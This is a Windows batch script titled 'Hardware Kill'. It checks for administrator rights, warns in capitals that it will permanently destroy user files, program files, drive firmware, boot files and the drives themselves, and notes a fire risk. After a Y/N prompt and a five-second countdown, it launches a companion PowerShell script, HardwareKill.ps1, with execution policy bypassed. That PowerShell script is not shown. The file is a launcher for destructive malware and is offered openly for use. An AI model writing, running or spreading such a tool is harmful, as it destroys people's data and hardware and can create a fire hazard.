@echo off
REM HARDWARE KILL - PERMANENT HARDWARE DESTRUCTION

REM Check for admin rights
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo.
    echo ====================================================
    echo   ERROR: ADMINISTRATOR RIGHTS REQUIRED
    echo ====================================================
    echo.
    echo This script must be run as Administrator!
    echo.
    echo Right-click this file and select:
    echo "Run as administrator"
    echo.
    echo ====================================================
    pause
    exit /b 1
)

cls
echo.
echo ====================================================
echo   WARNING - HARDWARE DESTRUCTION
echo ====================================================
echo.
echo [RUNNING AS ADMINISTRATOR - OK]
echo.
echo This script will PERMANENTLY DAMAGE your hard drives!
echo.
echo DATA-FIRST Strategy:
echo   1. User data destruction (Documents, Downloads)
echo   2. Program files destruction
echo   3. Firmware zone corruption
echo   4. Head thrashing (HDD) / SSD wear
echo   5. Boot + Windows destruction (system crashes)
echo.
echo RISKS:
echo   - Drive will be UNUSABLE FOREVER
echo   - Potential FIRE HAZARD
echo   - May damage motherboard
echo.
echo ====================================================
echo.

set /p confirm="Continue? (Y/N): "

if /i NOT "%confirm%"=="Y" (
    echo.
    echo Cancelled.
    timeout /t 2
    exit /b 0
)

echo.
echo ====================================================
echo   STARTING HARDWARE DESTRUCTION IN 5 SECONDS
echo   Press Ctrl+C to ABORT!
echo ====================================================
echo.

timeout /t 5

echo.
echo ====================================================
echo   LAUNCHING POWERSHELL SCRIPT...
echo ====================================================
echo.

PowerShell -NoProfile -ExecutionPolicy Bypass -File "%~dp0HardwareKill.ps1"

if %errorLevel% neq 0 (
    echo.
    echo ====================================================
    echo   ERROR: PowerShell script failed!
    echo   Error code: %errorLevel%
    echo ====================================================
    pause
    exit /b %errorLevel%
)
